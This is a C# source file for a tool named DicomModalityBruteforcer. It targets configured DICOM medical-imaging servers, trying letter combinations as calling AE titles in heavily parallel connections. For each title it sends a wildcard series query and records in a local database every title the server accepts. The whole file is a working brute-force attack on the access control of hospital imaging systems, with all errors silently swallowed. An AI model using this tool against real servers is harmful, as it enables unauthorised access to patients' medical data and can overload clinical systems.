using Dicom;
using Dicom.Network;
using Dicom.Network.Client;
using System;
using System.Collections.Generic;
using System.Linq;
using DicomClient = Dicom.Network.Client.DicomClient;
using LiteDB;
using System.Threading.Tasks;

namespace DicomModalityBruteforcer
{
    public static class Program
    {
        public static DicomCFindRequest CreateSeriesRequestByStudyUID(string studyInstanceUID)
        {
            // there is a built in function to create a Study-level CFind request very easily:
            // return DicomCFindRequest.CreateSeriesQuery(studyInstanceUID);

            // but consider to create your own request that contains exactly those DicomTags that
            // you realy need pro process your data and not to cause unneccessary traffic and IO load:
            var request = new DicomCFindRequest(DicomQueryRetrieveLevel.Series);

            request.Dataset.AddOrUpdate(new DicomTag(0x8, 0x5), "ISO_IR 100");

            // add the dicom tags with empty values that should be included in the result
            request.Dataset.AddOrUpdate(DicomTag.SeriesInstanceUID, "");
            request.Dataset.AddOrUpdate(DicomTag.SeriesDescription, "");
            request.Dataset.AddOrUpdate(DicomTag.Modality, "");
            request.Dataset.AddOrUpdate(DicomTag.NumberOfSeriesRelatedInstances, "");

            // add the dicom tags that contain the filter criterias
            request.Dataset.AddOrUpdate(DicomTag.StudyInstanceUID, studyInstanceUID);

            return request;
        }
        private static void GenerateLetterCombinations(int num_letters)
        {
            var config = ConfigHelper.GetConfig().ToList();

            Parallel.ForEach(config, scp => 
            {
                List<string> values = new List<string>();

                // Build one-letter combinations.
                for (char ch = 'A'; ch <= 'Z'; ch++)
                {
                    values.Add(ch.ToString());
                }
                for (int i = 1; i < num_letters; i++)
                {
                    // Make combinations containing i + 1 letters.
                    List<string> new_values = new List<string>();
                    values.AsParallel().WithExecutionMode(ParallelExecutionMode.ForceParallelism).WithDegreeOfParallelism(64).ForAll(async str =>
                    {
                        for (char ch = 'A'; ch <= 'Z'; ch++)
                        {

                            try
                            {
                                new_values.Add(str + ch);

                                var client = new DicomClient(scp.Host, scp.Port, false, str + ch, scp.ServerAET);

                                client.NegotiateAsyncOps();

                                var request = CreateSeriesRequestByStudyUID("*");

                                await client.AddRequestAsync(request);
                                await client.SendAsync();


                                Db.GetCollection<AetResult>(scp.ServerAET).Insert(new AetResult()
                                {
                                    Aet = str + ch
                                });
                                Console.WriteLine($"AET Server: {scp.ServerAET}, AET: {str + ch}");
                            }
                            catch
                            {

                            }
                        }
                    });
                    values = new_values;
                }
            });       

        }
        public static LiteDatabase Db;
        public static void Main(string[] args)
        {
            Db = new LiteDatabase($@"Filename={AppContext.BaseDirectory}\Database.db;Connection=shared");

            GenerateLetterCombinations(16);

            Console.ReadKey();
        }
    }
}

